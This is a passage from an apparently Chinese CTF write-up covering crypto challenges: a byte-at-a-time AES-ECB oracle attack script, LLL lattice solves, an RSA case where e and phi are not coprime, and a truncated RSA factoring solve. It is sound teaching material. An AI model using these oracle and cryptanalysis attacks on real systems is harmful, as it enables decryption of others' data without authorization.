class="built_in">range</span>(payload_length - <span class="number">1</span>, payload_length - <span class="number">1</span> - length_flag, -<span class="number">1</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * i</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">    d = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    d = <span class="built_in">bytes</span>.fromhex(d.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">        payload1 = <span class="string">b&quot;a&quot;</span> * i + flag + <span class="built_in">chr</span>(j).encode()</span><br><span class="line">        p.sendline(payload1)</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">        e = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line">        <span class="built_in">print</span>(d)</span><br><span class="line">        e = <span class="built_in">bytes</span>.fromhex(e.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">        e = e[payload_length - <span class="number">16</span> : payload_length]</span><br><span class="line">        <span class="keyword">if</span> e <span class="keyword">in</span> d:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j).encode()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;# 从后往前爆破flag(此方法需要知道填充模式)</span></span><br><span class="line"><span class="string">from Crypto.Util.Padding import pad</span></span><br><span class="line"><span class="string">from Crypto.Cipher import AES</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 在前面填充到满足AES加密的分组长度</span></span><br><span class="line"><span class="string">dic=&#x27;&#123;&#125;-BCTF0123456789abcdef&#x27;</span></span><br><span class="line"><span class="string">flag=b&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(length_flag):</span></span><br><span class="line"><span class="string">    p.recvline()    # b&quot;:\n&quot;</span></span><br><span class="line"><span class="string">    server_payload=b&#x27;a&#x27;*(length1+i+1)</span></span><br><span class="line"><span class="string">    p.sendline(server_payload)</span></span><br><span class="line"><span class="string">    server_flag=p.recvline()[:-1]</span></span><br><span class="line"><span class="string">    server_flag=base64.b64decode(server_flag)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    for j in dic:</span></span><br><span class="line"><span class="string">        p.recvline()    # b&quot;:\n&quot;</span></span><br><span class="line"><span class="string">        my_payload=j.encode()+flag</span></span><br><span class="line"><span class="string">        my_payload=pad(my_payload,AES.block_size)</span></span><br><span class="line"><span class="string">        my_payload=my_payload+b&#x27;a&#x27;  # 我也不知道这里为什么要多加一个字节,当i=2时不加这个字节就会出错</span></span><br><span class="line"><span class="string">        p.sendline(my_payload)</span></span><br><span class="line"><span class="string">        my_flag=p.recvline()[:-1]</span></span><br><span class="line"><span class="string">        my_flag=base64.b64decode(my_flag)</span></span><br><span class="line"><span class="string">        my_flag=my_flag[:16]</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if my_flag in server_flag:</span></span><br><span class="line"><span class="string">            flag=j.encode()+flag</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    print(flag)&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="LLL"><a href="#LLL" class="headerlink" title="LLL"></a>LLL</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;******&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> m.bit_length() == <span class="number">327</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">a = getPrime(<span class="number">1024</span>)</span><br><span class="line">c = getPrime(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">b = (a*m + c) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span></span><br><span class="line"><span class="string">b = 87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span></span><br><span class="line"><span class="string">p = 131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/m0_74345946/article/details/131742665">https://blog.csdn.net/m0_74345946/article/details/131742665</a> 抄的人家的P5<br>终于上sage了</p><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto. Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="number">169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span></span><br><span class="line">a = <span class="number">87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span></span><br><span class="line">p = <span class="number">131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a*r = flag + k*p</span></span><br><span class="line"></span><br><span class="line">M = Matrix(</span><br><span class="line"></span><br><span class="line">    ZZ, [[p, <span class="number">0</span>, <span class="number">0</span>], [-b, <span class="number">1</span>, <span class="number">0</span>], [a, <span class="number">0</span>, <span class="number">2</span>**<span class="number">400</span>]]  <span class="comment"># 400=c.bits</span></span><br><span class="line"></span><br><span class="line">)  <span class="comment"># Matrix()函数通常采用数值作为参数并返回一个矩阵对象</span></span><br><span class="line">c, m, k = M. LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="string">&quot;&quot;&quot;LLL 算法是一种格约化算法，用于查找格的约简基。</span></span><br><span class="line"><span class="string">LLL 方法返回一个由两个元素组成的元组：</span></span><br><span class="line"><span class="string">简化基和将原始基转换为简化基的矩阵&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(<span class="built_in">abs</span>(m))  <span class="comment"># abs()返回数字的绝对值</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;ee5cb1a5-257a-48b0-9d62-9ef56ff0651a&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/WP/geek2024/lll.png"></p><h2 id="easy-LLL"><a href="#easy-LLL" class="headerlink" title="easy_LLL"></a>easy_LLL</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() ==  <span class="number">255</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">    a = getPrime(<span class="number">1024</span>)</span><br><span class="line">    b = getPrime(<span class="number">400</span>)</span><br><span class="line">    c = (a * m + b) % p</span><br><span class="line">    <span class="keyword">return</span> c, a</span><br><span class="line"></span><br><span class="line">result = [encrypt(m) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">c = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> result]</span><br><span class="line">a = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> result]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span></span><br><span class="line"><span class="string">c = [25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980, 75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974, 4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536, 16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193, 106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500]</span></span><br><span class="line"><span class="string">a = [177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539, 154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561, 162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877, 156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623, 94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://dexterjie.github.io/2023/08/25/%E6%A0%BC%E5%AF%86%E7%A0%81%E8%BF%9B%E9%98%B6/">https://dexterjie.github.io/2023/08/25/%E6%A0%BC%E5%AF%86%E7%A0%81%E8%BF%9B%E9%98%B6/</a><br><img src="/img/WP/geek2024/ge.png"><br>我们这题的格跟这个很像。因为我不会在博客写格，凑合着看吧</p><pre><code>Ci=Ai*m+b mod p
</code></pre><p>经过等价替换可得到：</p><pre><code>Ci=Ai*m+b+Li*p
Ai*m+Li*p-Ci=-b
</code></pre><p>于是我们可以得到一个跟上图差不多的格，secret就是我们所求的m，Bi是我们的a, ri是我们的c。<br>右边的向量即为 (b, b, b, …, K&#x2F;p, -K)<br>为了使它们的比特位相同，b&#x3D;getPrime(400), 且b要小于K, 显然K得取2**400。<br>然后就继续愉快的套公式吧~</p><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto. Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span></span><br><span class="line">c = [</span><br><span class="line"></span><br><span class="line">    <span class="number">25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980</span>,</span><br><span class="line">    <span class="number">75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974</span>,</span><br><span class="line">    <span class="number">4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536</span>,</span><br><span class="line">    <span class="number">16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193</span>,</span><br><span class="line">    <span class="number">106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">a = [</span><br><span class="line"></span><br><span class="line">    <span class="number">177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539</span>,</span><br><span class="line">    <span class="number">154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561</span>,</span><br><span class="line">    <span class="number">162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877</span>,</span><br><span class="line">    <span class="number">156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623</span>,</span><br><span class="line">    <span class="number">94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(a)</span><br><span class="line"></span><br><span class="line">M = Matrix(QQ, n + <span class="number">2</span>, n + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line"></span><br><span class="line">    M[i, i] = p</span><br><span class="line">    M[-<span class="number">2</span>, i] = a[i]</span><br><span class="line">    M[-<span class="number">1</span>, i] = -c[i]</span><br><span class="line"></span><br><span class="line">K = <span class="number">2</span> ^ <span class="number">400</span></span><br><span class="line">t = K / p</span><br><span class="line"></span><br><span class="line">M[-<span class="number">2</span>, -<span class="number">2</span>] = t</span><br><span class="line">M[-<span class="number">1</span>, -<span class="number">1</span>] = K</span><br><span class="line"></span><br><span class="line">L = M. LLL()</span><br><span class="line"></span><br><span class="line">x = L[<span class="number">1</span>][-<span class="number">2</span>] // t</span><br><span class="line">m = x % p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(m).bit_length())</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/WP/geek2024/hnp.png"></p><h2 id="LinkedListModular"><a href="#LinkedListModular" class="headerlink" title="LinkedListModular"></a>LinkedListModular</h2><p>逆向部分我不会，主要说我的逆向队友爆出来的部分：</p><pre><code>p:0xae1e96a501b0360bd9ca423f2d9366e7c01c56e2d02dd20effc4c290e8bbd2cc53bb2a65b5262e254418d706335708ebd713cf9fac04fb1209d666adc6ebb6fee8c97a8dde4c23d3704198f918de46fe69a0d4d7878341c25118e7d1ac368753ce45f77b64580e0a89e300ac8f1be75d3a001df26bcfdaf82a479e14f6f25bfb 
q:0xcfc337e9217545d01babb00c330747aed4e6d99df42892bffce38e9b5c8a89d0528a7daac8d0075d72813669bc332688c9f6df2793b393580ac71f05db159e2dee3a6fd34ca2ba5ccae8428efefd6ee5454b6751ca71c008468278d7fe911e8c292172fa77468e996d80f4661c24ccdcc76c655a9168b0edeed165b2dd89501b 
e:0xd322 
c:0x6f23dc633746ecd6f6b6c753556a969ded7f9033b7617d4497b3a3ac685b92063e42c5657a01604ed084035637440889bd6865449021a15dfa33ed2d9531f50c41d452df7399554a35f4340993d64c9e1c7b54894d291b33ac95b39719093d788a1d218f54f00494990f8aff3d09e21edae2172cd8b42ae6f8abfdb05e5d9a6ff4b5092f60f8ce2a576e429a80bd15fc7073d75415c824fc450a9295128e30804760179bc3213ade1121d615f7ebbf192f93dd25031de12e12e15ae189db525ddbdfb2f54f098c0a027b6b1277c22108dfd2699f7946ce51f1c73a78721896bd8baa3b7fa4dfc063ab212eb0684531f372f2edc7b1f7baa3353b55cc750b95ff
p:0x7a7b8ee72d467eefe378502ca7804e0b55e0b68987dd7e8c03f7f7f717554183d2a0d99c7b33e8e1a28be171b77f8974616ac49645d7d5cf6fe5f4dcbfd1d25c3ad75e1eb3e4038d55a29c7114e176fd34626c2a8e76021d079cdb85cc8016acab00047910dfa5cd0439a3cc13527557ea879c184454a443711083a4f9d1d46b 
q:0xc17c7a7fbc5469af413f79c07cc5b892cfbbaa00950b115e267e83e2669f3f6779c7302ecfc9f850e0e4185892e96d356d65b1d372432c5a3f297cfb8373fe9a090a3f8dadf6ef6f2ca5b5107454ee6b1385d165bb4bb7776cbbccb8de1993a5ebb34ee365ff39b9ec9613121ba99d74759e0bf80726805ce03ed7f1e49375f1 
e:0x10ae 
c:0x5be0df3bb240ffd53f2d914eb79878231821a1dba5cc491a888c8fd553a905a7f1cea2750c39ea48ab4175115591310c0f9d63e1aee9d2480780f3ce4f98c57114cd2901ea6f560e04a0a9cec157dac3def734fa10ab54c27bf20211cf1f1f6f6afe5fc9ef5c9af864f054a5e61c48c6e6dc087cc350008d4232d08b0b5011923f1077ead75d54a792aa8a51a0b37bfa3faef0b9380cff209c7bf3a20fbbb087caf177b83c9bf03e965bd7347dd18418f3e50aef29cc89fa594ccd31b6f63f397eeba71629fec2c8699148dfd6be32deb96577690814bb4fe6dbefe2379468e0e317a870795ba04ab2e306fe5340700c415048eff5909a2453752845572a0931
p:0xa2562b53b1ff8b9635122c92612d8b6ea43ac0e40115c03befc0fb1bdefcda35a77f1cf23e5fdfa51ee864dac707524584cf4243cade36ea0b2ce14d9337d796f85b730483e7b6e342d44a36a1bc4052125b4eaef3724af9cfb8cab719d9efc54df851042408c2f69c1e5f46f00f067f7fa5cf7a3cb227879cbdefac7eab6cd3 
q:0xfeec12d4602e4895f53715d7e5a7583ee93c49079480aadae13c7c9d720a5fd976b6b9ac5ef65570f9e9d9b6d0b0b39f1372ea819bc14cc10a0a23a7f22f60c1a4fc536ebc4997bb873db9d8cb34f58fec2a05dc766cb865e09aa6c1a059713ccb1b31a9c986ecd4f45dc53c95e32ae6d370ee3566daa8b5f5bf6fe5fa20cd0f 
e:0xc051 
c:0xa798cb067b716ae1382d2070efb8bdb71050b88d9503a68fe5e851999071e4ee9f72c88b3975de09e8f436566d75f90e6388fddb3497b1e8f8f6bf8ad13cd35040d6b5b3f2e3ba3b1dddf14800840b0bfb08f25b5546cd5a34025e8eaaf289478c5f1b91229a31c980f773deb90cc0752da82aa17585bb616fc0b4f0749003a36f11acbdd4e85f7b092ee3864835c1063afccdbf3b585855a03e904cbc9c7fe9d86011a1237e396e4e2c72deec76829de7e67282cda86abd348bb98aac5ea83f3735c70a29f45cff6b4b76b03f12c4ea936368d13ba15a87da416a91be05ebaa0e67e1070e5d7a15f178c42ff05bab0e3de009f00b8e4cecf950f7250427e12
p:0xb06c6c2ac320c555cc4bc5bc89976436582de33d77788ed0eb1e5b726e242c2890ede50d918d3b7cab74141519e43761f515590279fb4fa8674a94d0985aedfa4b54580307416aa1888015e12e2536350ffa418203161b5fb2438035160327e21f4015d4b7393d90fff50f8d5be3da08abefac23898a55dc60a24470c8fe76eb 
q:0xadabc61519e9642517eb5c2a4a416f34c62a2c1ea6ec4c1d0d4686a95c31dcabba2c13fa8217e14fc541857b846d88027a1f7cfee9aba0757c3a92ab579086586c0e52b8184de0c69ae674b034342b0db40955fbffdc84ee875b9b84f7d2bf32836f03c304b34fea2ea03731af95d9156b91a16ff9338fe8a9fce24525b65509 
e:0xd2c2 
c:0x11861752a8ca58b777300efbc8ed05ea54d0c326cbfb573a0bd21fe5a20191b03f07be7aea9ac192adbe48726a0a03ccc838375d7c4fcd0b8814578fad47ea0407281bbb205960c6453fff81584ce334a23960c6321c720da7b190281c6d46b55e3bab0493d8ff6cf3855a2a6039c259f955e2cbdfb9dcabc813ad82c5333d535950e28cfb2aa556c32700f64c2b63058cf33fe6c40677a93d8c80a0f9db60da1ce90182ed0aa6ed33a2a9288dc9ff19ed9bffb59991bddf282b38a59ded27f71c4e5e0190e5244d916556c033bb2a184c87cf1923fb87902fa9dbb5ad5f927249bedfa4b47e5a379297926e3216a808b93ea2c7bf014c0b7ae29eacf595a43e
</code></pre><p>它说用轩禹直接解解不出来，注意到题目说注意e和phi，能看出e和phi不互素。<br>然后就发他了个脚本解决（这题不需要考虑t&#x3D;2时的二次同余）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当e约去公约数后与phi互素</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(msg[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x7A7B8EE72D467EEFE378502CA7804E0B55E0B68987DD7E8C03F7F7F717554183D2A0D99C7B33E8E1A28BE171B77F8974616AC49645D7D5CF6FE5F4DCBFD1D25C3AD75E1EB3E4038D55A29C7114E176FD34626C2A8E76021D079CDB85CC8016ACAB00047910DFA5CD0439A3CC13527557EA879C184454A443711083A4F9D1D46B</span></span><br><span class="line">q = <span class="number">0xC17C7A7FBC5469AF413F79C07CC5B892CFBBAA00950B115E267E83E2669F3F6779C7302ECFC9F850E0E4185892E96D356D65B1D372432C5A3F297CFB8373FE9A090A3F8DADF6EF6F2CA5B5107454EE6B1385D165BB4BB7776CBBCCB8DE1993A5EBB34EE365FF39B9EC9613121BA99D74759E0BF80726805CE03ED7F1E49375F1</span></span><br><span class="line">e = <span class="number">0x10AE</span></span><br><span class="line">c = <span class="number">0x5BE0DF3BB240FFD53F2D914EB79878231821A1DBA5CC491A888C8FD553A905A7F1CEA2750C39EA48AB4175115591310C0F9D63E1AEE9D2480780F3CE4F98C57114CD2901EA6F560E04A0A9CEC157DAC3DEF734FA10AB54C27BF20211CF1F1F6F6AFE5FC9EF5C9AF864F054A5E61C48C6E6DC087CC350008D4232D08B0B5011923F1077EAD75D54A792AA8A51A0B37BFA3FAEF0B9380CFF209C7BF3A20FBBB087CAF177B83C9BF03E965BD7347DD18418F3E50AEF29CC89FA594CCD31B6F63F397EEBA71629FEC2C8699148DFD6BE32DEB96577690814BB4FE6DBEFE2379468E0E317A870795BA04AB2E306FE5340700C415048EFF5909A2453752845572A0931</span></span><br><span class="line"></span><br><span class="line">decrypt(p, q, e, c)</span><br></pre></td></tr></table></figure><p>最后加起来md5就做出来了</p><h2 id="Number-theory"><a href="#Number-theory" class="headerlink" title="Number theory"></a>Number theory</h2><p>风二西的题库能找到第一部分</p><p>第二部分有点像2024年强网杯的abpq，但比它简单。<br>wp参考自<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/josephsurin/my-ctf-challenges/blob/509f60c5e57f773fe768f01d573effcf0d5e010b/downunderctf-2023/apbq-rsa-i/solve/solv.py">https://github.com/josephsurin/my-ctf-challenges/blob/509f60c5e57f773fe768f01d573effcf0d5e010b/downunderctf-2023/apbq-rsa-i/solve/solv.py</a><br>一个比赛用一个，爽</p><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto. Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"></span><br><span class="line">h0 = <span class="number">3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span></span><br><span class="line">n1 = <span class="number">20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span></span><br><span class="line">q = gcd(<span class="built_in">pow</span>(<span class="number">2024</span>, n1, n1) - h0, n1)</span><br><span class="line">p1 = n1 // q</span><br><span class="line"><span class="keyword">assert</span> p1 * q == n1</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p1=&quot;</span>, p1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>, q)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p1= 173372720206385834569678471333958784638586614453461924694852799411511525290419983713543942463722586256841515819523624239173976987599088346657357916198852116172460701468448365355983089723151147709153372627090761707327697899769559661187061166392094719933102425550671003720484285964838360777691632929809407043791</span></span><br><span class="line"><span class="string">q= 118874695786116734917065043442458952547874656505388902849583986739750433740760352688054822604427183355141871756128562592954061494068247418404217180198818025424511398092449124305805738302689459754842048957858402877387959339315483803736974651246922275580029822892751678239186974759117933061631242872453942209471</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># h1 = a1 * p + b1 * q1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># h2 = a2 * p + b2 * q1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n2 = p * q1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">hints = [</span><br><span class="line"></span><br><span class="line">    <span 